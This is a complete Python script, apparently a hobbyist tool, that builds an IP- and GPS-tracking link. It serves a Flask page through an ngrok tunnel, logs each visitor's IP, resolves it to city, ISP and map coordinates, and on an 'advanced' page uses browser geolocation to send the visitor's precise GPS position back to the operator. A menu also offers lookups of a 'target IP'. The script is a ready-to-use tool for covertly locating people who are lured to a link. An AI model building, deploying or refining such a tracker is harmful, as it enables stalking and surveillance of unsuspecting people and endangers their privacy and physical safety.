import os
import sys
import subprocess
import time
import threading
import datetime

def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_packages():
    try:
        import flask
        import requests
        import pyngrok
    except ImportError as e:
        pkg = str(e).split("'")[1]
        print(f"[!] Missing package '{pkg}', installing...")
        install_package(pkg)
        print("[✓] Package installed, restarting script...")
        os.execv(sys.executable, [sys.executable] + sys.argv)

def check_and_install_binary(binary_name):
    from shutil import which
    if which(binary_name) is None:
        print(f"[!] '{binary_name}' not found, attempting to install...")
        if binary_name == "wget":
            subprocess.run(["pkg", "install", "-y", "wget"], check=True)
        elif binary_name == "unzip":
            subprocess.run(["pkg", "install", "-y", "unzip"], check=True)
        else:
            print(f"[✗] Please install '{binary_name}' manually.")
            sys.exit(1)
        print(f"[✓] '{binary_name}' installed.")

check_and_install_packages()
check_and_install_binary("wget")
check_and_install_binary("unzip")

from flask import Flask, request, render_template_string
import requests
from pyngrok import ngrok, conf

app = Flask(__name__)

HTML_BASIC = """
<!doctype html>
<html><head><title>Welcome</title></head>
<body><h2>Thanks for visiting</h2><p>Your IP has been logged.</p></body>
</html>
"""

HTML_IMMEDIATE = """
<!DOCTYPE html>
<html>
<head>
  <title>Accurate Location Tracker</title>
</head>
<body>
  <h2>Thanks for visiting!</h2>
  <p>Your IP has been logged.</p>
  <script>
    fetch("/log_ip", {method: "POST"}).catch(() => {});
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function(position) {
          fetch("/submit_location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy
            })
          }).catch(() => {});
        }
      );
    }
  </script>
</body>
</html>
"""

def banner():
    print("\033[92m" + """
╔════════════════════════════════════════════════╗
║              Made by Mohimanul-TVM             ║
╚════════════════════════════════════════════════╝
""" + "\033[0m")

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = res.json()
        if data["status"] == "success":
            return {
                "IP": ip,
                "City": data.get("city"),
                "Region": data.get("regionName"),
                "Country": data.get("country"),
                "Latitude": data.get("lat"),
                "Longitude": data.get("lon"),
                "ISP": data.get("isp"),
                "Map": f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}",
                "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        else:
            return {"IP": ip, "Error": "Failed to get location data"}
    except Exception as e:
        return {"IP": ip, "Error": str(e)}

@app.route('/')
def index():
    return render_template_string(HTML_BASIC)

@app.route('/log_ip', methods=["POST"])
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = get_location(ip)
    print("\n--- Immediate IP Captured ---")
    for k, v in data.items():
        print(f"{k}: {v}")
    print("----------------------------\n")
    return "IP logged"

@app.route('/submit_location', methods=["POST"])
def submit_location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = data.get("accuracy")

    result = {
        "method": "GPS",
        "Latitude": lat,
        "Longitude": lon,
        "Accuracy (m)": accuracy,
        "Map": f"https://www.google.com/maps?q={lat},{lon}",
        "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    print("\n--- Accurate Location Captured (GPS) ---")
    for k, v in result.items():
        print(f"{k}: {v}")
    print("----------------------------------------\n")

    return "Location received!"

@app.route('/immediate')
def immediate():
    return render_template_string(HTML_IMMEDIATE)

def run_flask():
    try:
        app.run(host="0.0.0.0", port=5000)
    except Exception as e:
        print(f"[✗] Flask error: {e}")

def start_ngrok_tunnel():
    try:
        tunnel = ngrok.connect(5000, "http")
        print(f"\033[92m[✓] Ngrok tunnel started: {tunnel.public_url}\033[0m")
        return tunnel
    except Exception as e:
        print(f"[✗] Failed to start ngrok tunnel: {e}")
        sys.exit(1)

def ip_lookup():
    ip = input("Enter target IP address: ").strip()
    data = get_location(ip)
    print("\n\033[96m--- IP Info ---\033[0m")
    for k, v in data.items():
        print(f"{k}: {v}")
    print("\033[96m----------------\033[0m")

def generate_basic_link():
    tunnel = start_ngrok_tunnel()
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("\033[93m[•] Flask app running on http://0.0.0.0:5000/\033[0m")
    print(f"\033[93m[•] Share this link to capture visitor IP: {tunnel.public_url}\033[0m")
    try:
        while flask_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting and terminating ngrok...")
        ngrok.disconnect(tunnel.public_url)
        ngrok.kill()

def generate_immediate_link():
    token = input("Enter your Ngrok Authtoken: ").strip()
    conf.get_default().auth_token = token
    tunnel = start_ngrok_tunnel()
    full_url = tunnel.public_url + "/immediate"
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print(f"\033[93m[•] Flask app running on http://0.0.0.0:5000/\033[0m")
    print(f"\033[92m[✓] Share this link to capture IP immediately + GPS: {full_url}\033[0m")
    try:
        while flask_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting and terminating ngrok...")
        ngrok.disconnect(tunnel.public_url)
        ngrok.kill()

def menu():
    banner()
    while True:
        print("\n\033[93m[1]\033[0m Track location using IP")
        print("\033[93m[2]\033[0m Generate link & capture visitor IP (basic page)")
        print("\033[93m[3]\033[0m Generate link & capture visitor IP immediately + GPS (advanced)")
        print("\033[93m[0]\033[0m Exit")
        choice = input("Select an option: ").strip()
        if choice == '1':
            ip_lookup()
        elif choice == '2':
            generate_basic_link()
        elif choice == '3':
            generate_immediate_link()
        elif choice == '0':
            print("Exiting...")
            break
        else:
            print("Invalid option.")

if __name__ == '__main__':
    try:
        menu()
    except Exception as e:
        print(f"[✗] Unexpected error: {e}")
        sys.exit(1)
